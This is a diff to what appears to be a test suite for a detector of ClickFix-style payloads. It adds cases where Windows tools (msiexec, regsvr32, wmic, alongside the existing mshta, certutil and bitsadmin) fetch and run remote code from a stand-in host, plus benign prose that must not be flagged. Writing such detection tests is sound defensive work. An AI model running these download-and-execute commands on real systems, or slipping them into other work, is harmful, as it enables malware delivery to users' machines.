@@ -168,6 +168,13 @@ describe('the Windows programs a ClickFix payload runs through (B-165)', () => {
     ['mshta', 'mshta https://x.test/verify.hta'],
     ['certutil', 'certutil -urlcache -f http://x.test/a.exe a.exe'],
     ['bitsadmin', 'bitsadmin /transfer j http://x.test/a.exe %TEMP%\\a.exe'],
+    // Round 1 of the certification: the dash switch, a library loaded from another
+    // computer with no switch at all, and wmic aimed at a named machine.
+    ['msiexec with a dash switch', 'msiexec -i https://x.test/update.msi -qn'],
+    ['regsvr32 with a dash switch', 'regsvr32 -s \\\\x.test\\share\\a.dll'],
+    ['regsvr32 with a shared-folder library', 'regsvr32 \\\\x.test\\share\\a.dll'],
+    ['regsvr32 with a library over http', 'regsvr32.exe http://x.test/a.dll'],
+    ['wmic on a named machine', 'wmic /node:10.0.0.5 process call create "calc.exe"'],
   ]
 
   for (const [name, payload] of commands) {
@@ -185,6 +192,8 @@ describe('the Windows programs a ClickFix payload runs through (B-165)', () => {
     'conhost is the console host.',
     'forfiles selects files in a folder.',
     'wmic is deprecated in Windows 11.',
+    'see rundll32 docs, chapter 3',
+    'Run msiexec /x to uninstall the product',
   ]
 
   for (const text of prose) {
